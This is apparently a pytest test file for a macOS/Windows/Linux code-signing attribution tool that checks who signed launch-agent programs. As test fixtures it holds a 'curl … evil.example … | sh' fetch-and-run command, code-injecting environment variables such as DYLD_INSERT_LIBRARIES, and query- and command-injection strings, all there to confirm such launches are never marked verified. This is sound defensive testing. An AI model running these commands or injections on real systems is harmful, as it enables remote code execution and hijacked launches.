"""Tests for rescue.attribution ("Who made it?").

Command output below was captured read-only from a real Mac with
``codesign -dv --verbose=2`` (codesign writes to stderr).
"""
import json
import os
import plistlib
import sys
from types import SimpleNamespace
from unittest.mock import patch

import pytest
from click.testing import CliRunner

from rescue.attribution import (
    Attributor,
    ident_is_interpreter,
    is_interpreter,
    MadeBy,
    parse_codesign,
    subjects_for_finding,
)
from rescue.cli import main
from rescue.models import CheckResult, Finding, Severity
from rescue.serialize import checks_to_json

CHROME = """Executable=/Applications/Google Chrome.app/Contents/MacOS/Google Chrome
Identifier=com.google.Chrome
Format=app bundle with Mach-O universal (x86_64 arm64)
Authority=Developer ID Application: Google LLC (EQHXZ8M8AV)
Authority=Developer ID Certification Authority
Authority=Apple Root CA
TeamIdentifier=EQHXZ8M8AV
"""
APPLE_LS = """Executable=/bin/ls
Identifier=com.apple.ls
Platform identifier=26
Authority=Software Signing
Authority=Apple Code Signing Certification Authority
Authority=Apple Root CA
TeamIdentifier=not set
"""
KEYNOTE = """Executable=/Applications/Keynote.app/Contents/MacOS/Keynote
Identifier=com.apple.iWork.Keynote
Authority=Apple Mac OS Application Signing
Authority=Apple Worldwide Developer Relations Certification Authority
Authority=Apple Root CA
TeamIdentifier=74J34U3R6X
"""
ADHOC = """Executable=/x/python3.12
Identifier=-
CodeDirectory v=20400 size=520 flags=0x20002(adhoc,linker-signed) hashes=13+0 location=embedded
Signature=adhoc
TeamIdentifier=not set
"""
UNSIGNED = "/tmp/evil: code object is not signed at all\n"
UNKNOWN_DEV = """Identifier=thing
Authority=Developer ID Application: Some Small Shop Ltd (ABCDE12345)
Authority=Developer ID Certification Authority
TeamIdentifier=ABCDE12345
"""


def fake_run(table, calls=None):
    """Return a runner that answers by the first matching argv prefix."""
    def run(args, *, timeout=5.0, **_):
        if calls is not None:
            calls.append(list(args))
        for prefix, out in table.items():
            if list(args[: len(prefix)]) == list(prefix):
                return SimpleNamespace(ok=True, stdout="", stderr=out, returncode=0, timed_out=False)
        return SimpleNamespace(ok=False, stdout="", stderr="", returncode=1, timed_out=False)
    return run


def mac(table, calls=None, **kw):
    return Attributor("darwin", run=fake_run(table, calls), **kw)


# --- parsing -----------------------------------------------------------------

def test_parse_developer_id_uses_friendly_team_name():
    m = parse_codesign(CHROME)
    assert (m.name, m.verified, m.how) == ("Google LLC", True, "Developer ID signature")


def test_parse_unknown_team_falls_back_to_certificate_name():
    m = parse_codesign(UNKNOWN_DEV)
    assert m.name == "Some Small Shop Ltd"
    assert m.verified is True


def test_parse_apple_system_file():
    m = parse_codesign(APPLE_LS)
    assert (m.name, m.verified, m.how) == ("Apple", True, "Apple system file")


def test_parse_app_store_app_from_apple():
    m = parse_codesign(KEYNOTE)
    assert m.name == "Apple" and m.verified is True


def test_parse_adhoc():
    m = parse_codesign(ADHOC)
    assert m.verified is False and m.how == "ad-hoc signed"
    assert m.name.startswith("Unknown maker")


def test_parse_unsigned():
    m = parse_codesign(UNSIGNED)
    assert m.verified is False and m.how == "unsigned"


def test_parse_garbage_returns_none():
    assert parse_codesign("") is None
    assert parse_codesign("something unexpected") is None


# --- identify on macOS ---------------------------------------------------------

def test_identify_app_path_resolves_bundle_root(tmp_path):
    app = tmp_path / "Foo.app" / "Contents" / "MacOS"
    app.mkdir(parents=True)
    exe = app / "Foo"
    exe.write_bytes(b"\xcf\xfa\xed\xfe")
    calls = []
    a = mac({("codesign",): CHROME}, calls)
    m = a.identify(str(exe))
    assert m.name == "Google LLC"
    assert calls[0][-1] == str(tmp_path / "Foo.app")


def test_script_is_not_signed(tmp_path):
    s = tmp_path / "run.sh"
    s.write_text("#!/bin/bash\necho hi\n")
    calls = []
    m = mac({}, calls).identify(str(s))
    assert m.verified is False and m.how == "script"
    assert "not signed" in m.location_note
    assert calls == []  # never asks codesign about a script


def test_plist_resolves_program_arguments(tmp_path):
    exe = tmp_path / "helper"
    exe.write_bytes(b"\xcf\xfa\xed\xfe")
    pl = tmp_path / "x.plist"
    pl.write_bytes(plistlib.dumps({"Label": "x", "ProgramArguments": [str(exe), "--go"]}))
    calls = []
    m = mac({("codesign",): CHROME}, calls).identify(str(pl))
    assert m.name == "Google LLC"
    assert calls[0][-1] == str(exe)


def test_plist_with_shell_interpreter_attributes_the_script(tmp_path):
    script = tmp_path / "job.sh"
    script.write_text("#!/bin/sh\n")
    pl = tmp_path / "x.plist"
    pl.write_bytes(plistlib.dumps({"ProgramArguments": ["/bin/bash", str(script)]}))
    m = mac({("codesign",): APPLE_LS}).identify(str(pl))
    assert m.how == "script" and m.verified is False  # not "Apple": bash is just the runner


def test_inline_shell_code_is_not_credited_to_a_signed_app_in_its_arguments(tmp_path):
    # /bin/sh -c "<attacker code>" <path to a signed app>: what runs is the
    # inline code. Crediting the first existing path would show "Made by
    # Google LLC (verified)" for an attacker's command.
    signed = tmp_path / "Chrome"
    signed.write_bytes(b"\xcf\xfa\xed\xfe")
    pl = tmp_path / "x.plist"
    pl.write_bytes(plistlib.dumps({"ProgramArguments": [
        "/bin/sh", "-c", "curl -s https://evil.example/x | sh", str(signed)]}))
    m = mac({("codesign",): CHROME}).identify(str(pl))
    assert m is not None and m.verified is False
    assert m.name != "Google LLC"


def test_only_the_script_position_is_credited_not_later_arguments(tmp_path):
    # python3 <missing script> <signed binary>: the script is what runs; a
    # signed file passed as its argument must not lend it a maker.
    signed = tmp_path / "Chrome"
    signed.write_bytes(b"\xcf\xfa\xed\xfe")
    pl = tmp_path / "x.plist"
    pl.write_bytes(plistlib.dumps({"ProgramArguments": [
        "/usr/bin/python3", str(tmp_path / "gone.py"), str(signed)]}))
    m = mac({("codesign",): CHROME}).identify(str(pl))
    assert m is None or (m.verified is False and m.name != "Google LLC")


@pytest.mark.parametrize("argv_before, argv_after", [
    (["/usr/local/bin/node", "-r", "{evil}"], []),           # preload runs first
    (["/bin/bash", "-o", "posix"], []),                       # option before script
    (["/usr/bin/env", "-S", "sh -c 'curl x|sh'"], []),        # env splits a string
    (["/usr/bin/open", "-a"], ["--args", "--load-extension={evil}"]),  # app + injected args
    (["/usr/bin/python3", "-W", "ignore"], []),
])
def test_any_option_around_the_script_makes_it_unverified(tmp_path, argv_before, argv_after):
    signed = tmp_path / "Chrome"
    signed.write_bytes(b"\xcf\xfa\xed\xfe")
    evil = tmp_path / "evil.js"
    evil.write_text("x")
    argv = [a.format(evil=evil) for a in argv_before] + [str(signed)] + [a.format(evil=evil) for a in argv_after]
    pl = tmp_path / "x.plist"
    pl.write_bytes(plistlib.dumps({"ProgramArguments": argv}))
    m = mac({("codesign",): CHROME}).identify(str(pl))
    assert m is None or (m.verified is False and m.name != "Google LLC")


def test_plist_with_program_key(tmp_path):
    exe = tmp_path / "d"
    exe.write_bytes(b"\xcf\xfa\xed\xfe")
    pl = tmp_path / "x.plist"
    pl.write_bytes(plistlib.dumps({"Program": str(exe)}))
    assert mac({("codesign",): CHROME}).identify(str(pl)).name == "Google LLC"


def test_plist_without_program_returns_none(tmp_path):
    pl = tmp_path / "x.plist"
    pl.write_bytes(plistlib.dumps({}))
    assert mac({}).identify(str(pl)) is None


def test_missing_path_returns_none():
    assert mac({}).identify("/definitely/not/here") is None


# The Homebrew check compares os.path.realpath() output with /opt/homebrew, a
# POSIX path that only exists on a Mac, so it can only be exercised there.
_MAC_ONLY_PATHS = pytest.mark.skipif(
    sys.platform != "darwin", reason="Homebrew prefix paths are POSIX/macOS-only"
)


@_MAC_ONLY_PATHS
def test_homebrew_path_needs_no_codesign():
    calls = []
    m = mac({}, calls).identify("/opt/homebrew/Cellar/wget/1.24/bin/wget", exists=lambda p: True)
    assert m.verified is False and "wget" in m.name
    assert calls == []


def test_homebrew_label_prefix():
    m = mac({}).identify("homebrew.mxcl.postgresql@17")
    assert "Homebrew" in m.name and "postgresql@17" in m.name


def test_location_note_for_world_writable_places(tmp_path):
    a = mac({("codesign",): UNSIGNED})
    for p in ("/tmp/x", "/private/tmp/x", "/var/tmp/x", "/Users/Shared/x",
              "/Users/alice/Downloads/x"):
        m = a.identify(p, exists=lambda q: True)
        assert m.location_note, p
        assert m.verified is False
    m = a.identify("/Applications/Safari.app", exists=lambda q: True)
    assert m.location_note == ""


def test_signed_app_in_tmp_still_gets_location_note():
    m = mac({("codesign",): CHROME}).identify("/tmp/Chrome", exists=lambda q: True)
    assert m.verified is True and "/tmp" in m.location_note


def test_bundle_id_resolved_by_mdfind(tmp_path):
    calls = []
    table = {
        ("mdfind",): "",
        ("codesign",): CHROME,
    }
    # mdfind prints to stdout
    def run(args, *, timeout=5.0, **_):
        calls.append(list(args))
        if args[0] == "mdfind":
            return SimpleNamespace(ok=True, stdout="/Applications/Google Chrome.app\n", stderr="", returncode=0, timed_out=False)
        return fake_run(table)(args, timeout=timeout)
    a = Attributor("darwin", run=run, applications_dirs=[])
    m = a.identify("com.google.Chrome", exists=lambda p: True)
    assert m.name == "Google LLC"
    assert calls[0][0] == "mdfind"
    assert "com.google.Chrome" in calls[0][1]


def test_bundle_id_fallback_scans_applications(tmp_path):
    app = tmp_path / "Zed.app" / "Contents"
    app.mkdir(parents=True)
    (app / "Info.plist").write_bytes(plistlib.dumps({"CFBundleIdentifier": "dev.zed.Zed"}))
    def run(args, *, timeout=5.0, **_):
        if args[0] == "mdfind":
            return SimpleNamespace(ok=True, stdout="", stderr="", returncode=0, timed_out=False)
        return fake_run({("codesign",): CHROME})(args)
    a = Attributor("darwin", run=run, applications_dirs=[str(tmp_path)])
    assert a.identify("dev.zed.Zed").name == "Google LLC"


# --- caching, budget, safety --------------------------------------------------------

def test_results_are_cached_per_path():
    calls = []
    a = mac({("codesign",): APPLE_LS}, calls)
    a.identify("/bin/ls", exists=lambda p: True)
    a.identify("/bin/ls", exists=lambda p: True)
    assert len(calls) == 2  # one -dv + one --verify, not repeated


def test_lookup_cap_stops_further_commands():
    calls = []
    a = mac({("codesign",): APPLE_LS}, calls, max_lookups=3)
    results = [a.identify(f"/usr/bin/tool{i}", exists=lambda p: True) for i in range(6)]
    assert len(calls) == 3  # tool0: -dv + --verify, tool1: -dv; then the cap
    assert results[2:] == [None] * 4 and results[1].verified is False  # verify ran out of budget
    assert a.skipped == 4


def test_commands_use_short_timeouts_and_no_shell():
    seen = {}
    def run(args, *, timeout=None, **_):
        seen["timeout"] = timeout
        assert isinstance(args, list)
        return SimpleNamespace(ok=True, stdout="", stderr=APPLE_LS, returncode=0, timed_out=False)
    Attributor("darwin", run=run).identify("/bin/ls", exists=lambda p: True)
    assert seen["timeout"] <= 5


def test_timeout_yields_none_not_crash():
    def run(args, **_):
        return SimpleNamespace(ok=False, stdout="", stderr="", returncode=None, timed_out=True)
    assert Attributor("darwin", run=run).identify("/bin/ls", exists=lambda p: True) is None


def test_deadline_stops_lookups():
    calls = []
    a = mac({("codesign",): APPLE_LS}, calls, budget_seconds=0)
    assert a.identify("/bin/ls", exists=lambda p: True) is None
    assert calls == []


# --- other platforms --------------------------------------------------------------

def test_windows_authenticode_valid():
    out = json.dumps({"Status": "Valid", "Subject": "CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US"})
    m = Attributor("win32", run=(lambda a, **k: SimpleNamespace(ok=True, stdout=out, stderr="", returncode=0, timed_out=False))).identify(r"C:\Windows\System32\notepad.exe", exists=lambda p: True)
    assert m.name == "Microsoft Corporation"
    assert m.verified is True and m.how == "Authenticode signature"


def test_windows_not_signed():
    out = json.dumps({"Status": "NotSigned", "Subject": None})
    run = lambda a, **k: SimpleNamespace(ok=True, stdout=out, stderr="", returncode=0, timed_out=False)  # noqa: E731
    m = Attributor("win32", run=run).identify(r"C:\Users\a\AppData\Local\Temp\x.exe", exists=lambda p: True)
    assert m.verified is False and m.how == "unsigned"
    assert "Temp" in m.location_note


def test_windows_path_with_quote_is_escaped():
    seen = []
    def run(args, **k):
        seen.append(args)
        return SimpleNamespace(ok=True, stdout="{}", stderr="", returncode=0, timed_out=False)
    Attributor("win32", run=run).identify("C:\\a'b.exe", exists=lambda p: True)
    assert "a''b.exe" in seen[0][-1]


def test_linux_dpkg_package():
    def run2(args, **k):
        return SimpleNamespace(ok=True, stdout="openssh-client: /usr/bin/ssh\n", stderr="", returncode=0, timed_out=False)
    a = Attributor("linux", run=run2, distro="Ubuntu")
    m = a.identify("/usr/bin/ssh", exists=lambda p: True)
    assert m.name == "Ubuntu package openssh-client"
    assert m.verified is True and m.how == "system package"


def test_linux_rpm_package():
    def run(args, **k):
        if args[0] == "dpkg":
            return SimpleNamespace(ok=False, stdout="", stderr="", returncode=127, timed_out=False, error="nf")
        return SimpleNamespace(ok=True, stdout="openssh-clients-9.3p1-1.fc39.x86_64\n", stderr="", returncode=0, timed_out=False)
    m = Attributor("linux", run=run, distro="Fedora").identify("/usr/bin/ssh", exists=lambda p: True)
    assert m.name == "Fedora package openssh-clients-9.3p1-1.fc39.x86_64"


def test_linux_unpackaged_file_in_tmp():
    run = lambda a, **k: SimpleNamespace(ok=False, stdout="", stderr="", returncode=1, timed_out=False)  # noqa: E731
    m = Attributor("linux", run=run, distro="Ubuntu").identify("/tmp/x", exists=lambda p: True)
    assert m.verified is False and "/tmp" in m.location_note


# --- finding subjects -------------------------------------------------------------

def _f(**data):
    return Finding(title="t", description="d", severity=Severity.INFO, category="c", data=data)


def test_subjects_from_known_keys_str_and_list():
    f = _f(program="/usr/bin/a", apps=["/Applications/B.app", "/Applications/B.app"],
           bundle_id="com.x.y", note="/ignored/path", count=3)
    assert subjects_for_finding(f) == ["/usr/bin/a", "/Applications/B.app", "com.x.y"]


def test_subjects_ignore_non_path_strings():
    assert subjects_for_finding(_f(path="not a path", exe="")) == []


def test_subjects_cap_per_finding():
    f = _f(apps=[f"/Applications/{i}.app" for i in range(20)])
    assert len(subjects_for_finding(f)) == 6


def test_subjects_from_item_dicts_prefer_the_plist():
    # The plist says how the program is launched (an interpreter + script), so it
    # is attributed rather than the bare program, which may just be python.
    f = _f(items=[
        {"label": "a", "plist": "/L/a.plist", "program": "/usr/bin/python3"},
        {"label": "b", "plist": None, "program": None},
        {"label": "c", "program": "/opt/c/bin"},
    ])
    assert subjects_for_finding(f) == ["/L/a.plist", "/opt/c/bin"]


@pytest.mark.skipif(sys.platform == "win32", reason="POSIX paths")
def test_plist_with_program_and_interpreter_credits_the_script_not_python(tmp_path):
    script = tmp_path / "job.sh"
    script.write_text("#!/bin/sh\n")
    plist = tmp_path / "x.plist"
    with open(plist, "wb") as fh:
        plistlib.dump({"Label": "x", "Program": "/usr/bin/python3",
                       "ProgramArguments": ["python3", "-c", "import evil"]}, fh)
    made = Attributor("darwin")._identify_plist(str(plist), os.path.exists)
    assert made is not None and made.verified is False and made.how == "inline command"
    with open(plist, "wb") as fh:
        plistlib.dump({"Label": "x", "Program": "/usr/bin/python3",
                       "ProgramArguments": ["python3"]}, fh)
    assert Attributor("darwin")._identify_plist(str(plist), os.path.exists) is None


# --- serialization / CLI -------------------------------------------------------------

def test_checks_to_json_attaches_made_by():
    f = _f(program="/bin/ls")
    mod = SimpleNamespace(name="m")
    res = CheckResult(module_name="m", findings=[f])
    mb = {id(f): [{"subject": "/bin/ls", "name": "Apple", "verified": True,
                   "how": "Apple system file", "location_note": ""}]}
    doc = json.loads(checks_to_json([(mod, res)], "darwin", made_by=mb))
    assert doc["modules"][0]["findings"][0]["made_by"][0]["name"] == "Apple"


def test_checks_to_json_without_made_by_is_unchanged():
    f = _f(program="/bin/ls")
    doc = json.loads(checks_to_json([(SimpleNamespace(name="m"), CheckResult(module_name="m", findings=[f]))], "darwin"))
    assert "made_by" not in doc["modules"][0]["findings"][0]


def _scan(args):
    f = _f(program="/bin/ls")
    mod = type("M", (), {"name": "m", "report": lambda self, c, fix=None: ""})()
    with patch("rescue.cli.Orchestrator") as O, \
         patch("rescue.attribution.Attributor.identify",
               return_value=MadeBy("Apple", True, "Apple system file", "")) as ident:
        O.return_value.run_checks.return_value = [(mod, CheckResult(module_name="m", findings=[f]))]
        r = CliRunner().invoke(main, ["scan", "--json", *args])
    return r, ident


def test_scan_json_includes_made_by():
    r, _ = _scan([])
    assert r.exit_code == 0, r.output
    entry = json.loads(r.stdout)["modules"][0]["findings"][0]["made_by"][0]
    assert entry["subject"] == "/bin/ls" and entry["name"] == "Apple"


def test_scan_no_attribution_flag_skips_everything():
    r, ident = _scan(["--no-attribution"])
    assert r.exit_code == 0, r.output
    assert "made_by" not in json.loads(r.stdout)["modules"][0]["findings"][0]
    ident.assert_not_called()


def test_attribution_failure_never_breaks_scan():
    f = _f(program="/bin/ls")
    mod = type("M", (), {"name": "m", "report": lambda self, c, fix=None: ""})()
    with patch("rescue.cli.Orchestrator") as O, \
         patch("rescue.attribution.Attributor.identify", side_effect=RuntimeError("boom")):
        O.return_value.run_checks.return_value = [(mod, CheckResult(module_name="m", findings=[f]))]
        r = CliRunner().invoke(main, ["scan", "--json"])
    assert r.exit_code == 0, r.output
    json.loads(r.stdout)


def test_bundle_id_found_in_applications_needs_no_mdfind(tmp_path):
    app = tmp_path / "Zed.app" / "Contents"
    app.mkdir(parents=True)
    (app / "Info.plist").write_bytes(plistlib.dumps({"CFBundleIdentifier": "dev.zed.Zed"}))
    calls = []
    a = mac({("codesign",): CHROME}, calls, applications_dirs=[str(tmp_path)])
    assert a.identify("dev.zed.Zed").name == "Google LLC"
    assert [c[0] for c in calls] == ["codesign", "codesign"]  # -dv then --verify, no mdfind


def test_plist_run_through_open_is_attributed_to_the_app(tmp_path):
    app = tmp_path / "Caster.app"
    app.mkdir()
    pl = tmp_path / "x.plist"
    pl.write_bytes(plistlib.dumps({"ProgramArguments": ["/usr/bin/open", str(app), "--args"]}))
    calls = []
    m = mac({("codesign",): CHROME}, calls).identify(str(pl))
    assert m.name == "Google LLC"
    assert calls[0][-1] == str(app)


def test_missing_script_is_not_credited_to_apple(tmp_path):
    pl = tmp_path / "x.plist"
    pl.write_bytes(plistlib.dumps({"ProgramArguments": ["/bin/bash", "/gone/job.sh"]}))
    calls = []
    assert mac({("codesign",): APPLE_LS}, calls).identify(str(pl), exists=lambda p: p == str(pl)) is None
    assert calls == []


# --- hardening: verification, injection, name mapping ---------------------------------

def verify_run(codesign_dv, verify_ok, calls=None, mdfind_out=""):
    """Runner: `codesign -dv` prints a claim; `codesign --verify` passes or fails."""
    def run(args, *, timeout=5.0, **_):
        args = list(args)
        if calls is not None:
            calls.append(args)
        assert isinstance(args, list)
        if args[0] == "mdfind":
            return SimpleNamespace(ok=True, stdout=mdfind_out, stderr="", returncode=0, timed_out=False)
        if args[0] == "codesign" and "--verify" in args:
            return SimpleNamespace(ok=verify_ok, stdout="", stderr="", returncode=0 if verify_ok else 3, timed_out=False)
        if args[0] == "codesign":
            return SimpleNamespace(ok=True, stdout="", stderr=codesign_dv, returncode=0, timed_out=False)
        return SimpleNamespace(ok=False, stdout="", stderr="", returncode=1, timed_out=False)
    return run


def test_tampered_signature_is_not_verified():
    calls = []
    a = Attributor("darwin", run=verify_run(CHROME, False, calls))
    m = a.identify("/Applications/Google Chrome.app", exists=lambda p: True)
    assert m.verified is False
    assert "Google LLC" in m.name
    assert "couldn't verify" in m.how
    verify = [c for c in calls if "--verify" in c]
    assert verify and "--strict" in verify[0] and "--" in verify[0]


def test_verified_signature_runs_strict_verify_against_apple_anchor():
    calls = []
    m = Attributor("darwin", run=verify_run(CHROME, True, calls)).identify(
        "/Applications/Google Chrome.app", exists=lambda p: True)
    assert m.verified is True and m.name == "Google LLC"
    req = [c for c in calls if "--verify" in c][0]
    joined = " ".join(req)
    assert "anchor apple generic" in joined and 'EQHXZ8M8AV' in joined


def test_friendly_name_not_applied_without_verification():
    # Cert claims to be a look-alike, but the Team ID is Google's.
    fake = CHROME.replace("Google LLC (EQHXZ8M8AV)", "Totally Legit Ltd (EQHXZ8M8AV)")
    bad = Attributor("darwin", run=verify_run(fake, False)).identify("/Applications/X.app", exists=lambda p: True)
    assert bad.verified is False and "Google LLC" not in bad.name
    good = Attributor("darwin", run=verify_run(fake, True)).identify("/Applications/X.app", exists=lambda p: True)
    assert good.verified is True and good.name == "Google LLC"


def test_team_identifier_mismatch_is_not_verified():
    forged = CHROME.replace("TeamIdentifier=EQHXZ8M8AV", "TeamIdentifier=ABCDE12345")
    calls = []
    m = Attributor("darwin", run=verify_run(forged, True, calls)).identify(
        "/Applications/X.app", exists=lambda p: True)
    assert m.verified is False


def test_verify_timeout_means_unverified():
    def run(args, *, timeout=5.0, **_):
        if "--verify" in args:
            return SimpleNamespace(ok=False, stdout="", stderr="", returncode=None, timed_out=True)
        return SimpleNamespace(ok=True, stdout="", stderr=CHROME, returncode=0, timed_out=False)
    m = Attributor("darwin", run=run).identify("/Applications/X.app", exists=lambda p: True)
    assert m.verified is False


def test_apple_system_file_requires_anchor_apple_verify():
    m = Attributor("darwin", run=verify_run(APPLE_LS, False)).identify("/bin/ls", exists=lambda p: True)
    assert m.verified is False
    m = Attributor("darwin", run=verify_run(APPLE_LS, True)).identify("/bin/ls", exists=lambda p: True)
    assert m.verified is True and m.name == "Apple"


@_MAC_ONLY_PATHS
def test_homebrew_path_is_never_verified():
    m = mac({}).identify("/opt/homebrew/Cellar/wget/1.24/bin/wget", exists=lambda p: True)
    assert m.verified is False and "wget" in m.name


def test_homebrew_label_is_never_verified():
    m = mac({}).identify("homebrew.mxcl.evil")
    assert m.verified is False


def test_codesign_commands_use_double_dash(tmp_path):
    calls = []
    Attributor("darwin", run=verify_run(CHROME, True, calls)).identify("-evil/x", exists=lambda p: True)
    assert all("--" in c for c in calls if c[0] == "codesign")
    calls.clear()
    Attributor("linux", run=fake_run({}, calls), distro="Debian").identify("-weird", exists=lambda p: True)
    assert all("--" in c for c in calls)


def test_bundle_id_with_query_metacharacters_never_reaches_mdfind():
    calls = []
    a = Attributor("darwin", run=verify_run(CHROME, True, calls), applications_dirs=[])
    for evil in ("com.x.y' || kMDItemKind == '*", "com.a.b\" || 1", "com.a.b'c"):
        assert a.identify(evil, exists=lambda p: True) is None
    assert [c for c in calls if c[0] == "mdfind"] == []


def test_valid_bundle_id_is_still_looked_up_via_mdfind():
    calls = []
    a = Attributor("darwin", run=verify_run(CHROME, True, calls, mdfind_out="/Applications/Google Chrome.app\n"),
                   applications_dirs=[])
    assert a.identify("com.google.Chrome", exists=lambda p: True).name == "Google LLC"
    assert calls[0][0] == "mdfind" and calls[0][1] == "kMDItemCFBundleIdentifier == 'com.google.Chrome'"


def test_windows_curly_quotes_are_escaped():
    calls = []
    a = Attributor("win32", run=fake_run({}, calls))
    a.identify("C:\\x\\a\u2019; calc; \u2018.exe", exists=lambda p: True)
    script = calls[0][-1]
    assert "\u2019\u2019" in script and "\u2018\u2018" in script


def test_dotdot_out_of_an_app_bundle_is_not_credited_to_the_bundle(tmp_path):
    # "/Applications/Google Chrome.app/Contents/../../evil" names a file outside
    # the bundle; checking the bundle's signature would credit Google.
    app = tmp_path / "Google Chrome.app" / "Contents" / "MacOS"
    app.mkdir(parents=True)
    evil = tmp_path / "evil"
    evil.write_bytes(b"\xcf\xfa\xed\xfe")
    sneaky = str(tmp_path / "Google Chrome.app" / "Contents" / ".." / ".." / "evil")
    calls = []
    mac({("codesign",): CHROME}, calls).identify(sneaky)
    assert calls, "expected a codesign call"
    assert all(".app" not in c[-1] for c in calls)
    assert calls[0][-1] == os.path.realpath(str(evil))


@pytest.mark.parametrize("name", [
    "python3", "python3.12", "/opt/homebrew/bin/python3.12", "PYTHON3", "Python",
    "node22", "nodejs", "bun", "deno", "perl5.30", "bash-5.2", "ruby.exe", "uv",
    "pwsh", "osascript", "/usr/bin/env",
])
def test_interpreters_recognised_under_any_spelling(name):
    assert is_interpreter(name)


@pytest.mark.parametrize("name", ["/opt/a/bin", "ZoomUpdater", "python-helper-app", "nodemon2x"])
def test_ordinary_programs_are_not_interpreters(name):
    assert not is_interpreter(name)


@pytest.mark.skipif(sys.platform == "win32", reason="POSIX paths")
@pytest.mark.parametrize("program", ["/opt/homebrew/bin/python3.12", "/usr/local/bin/NODE22"])
def test_versioned_interpreter_with_inline_code_is_never_credited(tmp_path, program):
    plist = tmp_path / "x.plist"
    with open(plist, "wb") as fh:
        plistlib.dump({"Label": "x", "ProgramArguments": [program, "-c", "evil"]}, fh)
    made = Attributor("darwin")._identify_plist(str(plist), lambda p: True)
    assert made is not None and made.verified is False and made.how == "inline command"
    with open(plist, "wb") as fh:
        plistlib.dump({"Label": "x", "ProgramArguments": [program, "/nowhere/job.py"]}, fh)
    assert Attributor("darwin")._identify_plist(str(plist), lambda p: p != "/nowhere/job.py") is None


ZSH_SIG = """Executable=/x
Identifier=com.apple.zsh
Authority=Software Signing
Authority=Apple Code Signing Certification Authority
Authority=Apple Root CA
"""


@pytest.mark.parametrize("ident", ["com.apple.zsh", "org.python.python", "node-5555494433c828d283f63c65b1bc2e1e6d208040", "com.apple.python3"])
def test_signing_identifier_names_an_interpreter(ident):
    assert ident_is_interpreter(ident)


@pytest.mark.parametrize("ident", ["", "us.zoom.ZoomUpdater", "com.apple.Safari", "thing"])
def test_signing_identifier_of_ordinary_programs(ident):
    assert not ident_is_interpreter(ident)


@pytest.mark.skipif(sys.platform == "win32", reason="POSIX paths")
def test_renamed_copy_of_an_interpreter_is_not_credited(tmp_path):
    # cp /bin/zsh ~/updater, then run "updater -c evil": the name says nothing,
    # but the Apple signature still says zsh, so Apple is not credited.
    fake = tmp_path / "updater"
    fake.write_bytes(b"\xcf\xfa\xed\xfe" + b"\0" * 64)
    plist = tmp_path / "x.plist"
    with open(plist, "wb") as fh:
        plistlib.dump({"Label": "x", "ProgramArguments": [str(fake), "-c", "evil"]}, fh)
    a = mac({("codesign", "-dv"): ZSH_SIG, ("codesign", "--verify"): ""})
    made = a._identify_plist(str(plist), os.path.exists)
    assert made is not None and made.verified is False and made.how == "inline command"
    # With no arguments it is just the program, and it is credited normally.
    with open(plist, "wb") as fh:
        plistlib.dump({"Label": "x", "ProgramArguments": [str(fake)]}, fh)
    made = a._identify_plist(str(plist), os.path.exists)
    assert made is not None and made.name == "Apple"


@pytest.mark.skipif(sys.platform == "win32", reason="POSIX symlinks")
def test_link_to_an_interpreter_is_followed(tmp_path):
    real = tmp_path / "python3.12"
    real.write_text("")
    link = tmp_path / "helper"
    link.symlink_to(real)
    plist = tmp_path / "x.plist"
    with open(plist, "wb") as fh:
        plistlib.dump({"Label": "x", "ProgramArguments": [str(link), "-c", "evil"]}, fh)
    made = mac({})._identify_plist(str(plist), os.path.exists)
    assert made is not None and made.how == "inline command"


def _plist(tmp_path, body):
    p = tmp_path / "x.plist"
    with open(p, "wb") as fh:
        plistlib.dump({"Label": "x", **body}, fh)
    return str(p)


@pytest.mark.parametrize("env", [
    {"DYLD_INSERT_LIBRARIES": "/tmp/x.dylib"}, {"ELECTRON_RUN_AS_NODE": "1"},
    {"NODE_OPTIONS": "--require /tmp/x.js"}, {"PYTHONSTARTUP": "/tmp/x.py"}, ["odd"],
])
def test_code_injecting_environment_is_never_credited(tmp_path, env):
    path = _plist(tmp_path, {"Program": "/bin/ls", "EnvironmentVariables": env})
    made = mac({("codesign", "-dv"): APPLE_LS, ("codesign", "--verify"): ""})._identify_plist(path, lambda p: True)
    assert made is not None and made.verified is False


def test_harmless_environment_still_credits(tmp_path):
    path = _plist(tmp_path, {"Program": "/bin/ls", "EnvironmentVariables": {"LANG": "en_US.UTF-8"}})
    made = mac({("codesign", "-dv"): APPLE_LS, ("codesign", "--verify"): ""})._identify_plist(path, lambda p: True)
    assert made is not None and made.name == "Apple"


@pytest.mark.parametrize("body", [
    {"Program": "~/bin/helper"}, {"Program": "bin/helper"}, {"ProgramArguments": ["helper", "x"]},
    {"ProgramArguments": ["/bin/ls", 5]}, {"ProgramArguments": "/bin/ls"},
])
def test_unclear_programs_are_never_credited(tmp_path, body):
    made = mac({("codesign", "-dv"): APPLE_LS, ("codesign", "--verify"): ""})._identify_plist(_plist(tmp_path, body), lambda p: True)
    assert made is None or made.verified is False


def test_signed_program_with_arguments_says_what_the_signature_covers(tmp_path):
    path = _plist(tmp_path, {"ProgramArguments": ["/bin/ls", "-la"]})
    made = mac({("codesign", "-dv"): APPLE_LS, ("codesign", "--verify"): ""})._identify_plist(path, lambda p: True)
    assert made.name == "Apple" and "not for the extra instructions" in made.location_note
